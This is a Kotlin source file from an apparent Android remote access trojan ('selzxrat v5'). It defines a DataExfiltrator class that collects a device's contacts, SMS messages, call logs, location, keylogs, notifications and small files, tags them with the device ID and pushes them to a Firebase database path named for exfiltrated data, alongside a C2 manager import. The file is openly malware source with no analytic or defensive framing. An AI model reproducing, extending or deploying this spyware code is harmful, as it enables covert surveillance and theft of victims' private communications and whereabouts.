package com.selzxrat.v5.services

import android.content.Context
import android.util.Log
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.selzxrat.v5.C2Manager
import kotlinx.coroutines.*
import java.io.File

class DataExfiltrator(private val context: Context) {

    companion object {
        private const val TAG = "DataExfiltrator"
        private const val EXFIL_REF = "selzxratV5/exfiltrated"
    }

    data class ExfilPayload(
        val type: String,
        val content: String,
        val deviceId: String,
        val timestamp: Long = System.currentTimeMillis(),
        val metadata: Map<String, String> = emptyMap()
    )

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var exfilRef: DatabaseReference
    private var isExfiltrating = false

    fun initialize() {
        try {
            exfilRef = FirebaseDatabase.getInstance().getReference(EXFIL_REF)
            Log.d(TAG, "DataExfiltrator initialized")
        } catch (e: Exception) {
            Log.e(TAG, "Exfiltrator init failed: ${e.message}")
        }
    }

    fun exfiltrate(type: String, content: String, metadata: Map<String, String> = emptyMap()) {
        if (!::exfilRef.isInitialized) {
            Log.w(TAG, "Exfiltrator not initialized")
            return
        }

        val deviceId = android.provider.Settings.Secure.getString(
            context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
        ) ?: "unknown"

        val payload = mapOf(
            "type" to type,
            "content" to content,
            "deviceId" to deviceId,
            "timestamp" to System.currentTimeMillis(),
            "metadata" to metadata
        )

        scope.launch {
            try {
                exfilRef.push().setValue(payload)
                Log.d(TAG, "Exfiltrated: $type (${content.length} chars)")
            } catch (e: Exception) {
                Log.e(TAG, "Exfil failed: ${e.message}")
            }
        }
    }

    fun exfiltrateFile(filePath: String, fileType: String = "file") {
        val file = File(filePath)
        if (!file.exists()) {
            Log.w(TAG, "File not found: $filePath")
            return
        }

        scope.launch {
            try {
                val content = if (file.length() < 1024 * 100) { // < 100KB, send as text
                    file.readText()
                } else {
                    "[FILE TOO LARGE: ${file.length()} bytes]"
                }

                exfiltrate(fileType, content, mapOf(
                    "fileName" to file.name,
                    "filePath" to file.absolutePath,
                    "fileSize" to file.length().toString()
                ))
            } catch (e: Exception) {
                Log.e(TAG, "File exfil failed: ${e.message}")
            }
        }
    }

    fun exfiltrateContacts(contacts: List<Map<String, String>>) {
        exfiltrate("contacts", organizeContacts(contacts))
    }

    fun exfiltrateSMS(smsList: List<Map<String, String>>) {
        exfiltrate("sms", organizeSMS(smsList))
    }

    fun exfiltrateCallLogs(logs: List<Map<String, String>>) {
        exfiltrate("call_logs", organizeCallLogs(logs))
    }

    fun exfiltrateLocation(location: Map<String, Any>) {
        exfiltrate("location", location.toString())
    }

    fun exfiltrateKeylogs(keylogs: String) {
        exfiltrate("keylogs", keylogs)
    }

    fun exfiltrateNotifications(notifications: List<Map<String, String>>) {
        exfiltrate("notifications", notifications.toString())
    }

    private fun organizeContacts(contacts: List<Map<String, String>>): String {
        return contacts.joinToString("\n") { contact ->
            "Name: ${contact["name"]} | Number: ${contact["number"]} | Type: ${contact["type"]}"
        }
    }

    private fun organizeSMS(smsList: List<Map<String, String>>): String {
        return smsList.joinToString("\n---\n") { sms ->
            "From: ${sms["address"]} | Date: ${sms["date"]} | Type: ${sms["type"]}\nMessage: ${sms["body"]}"
        }
    }

    private fun organizeCallLogs(logs: List<Map<String, String>>): String {
        return logs.joinToString("\n") { log ->
            "Name: ${log["name"]} | Number: ${log["number"]} | Duration: ${log["duration"]}s | Type: ${log["type"]} | Date: ${log["date"]}"
        }
    }

    fun destroy() {
        scope.cancel()
        isExfiltrating = false
    }
}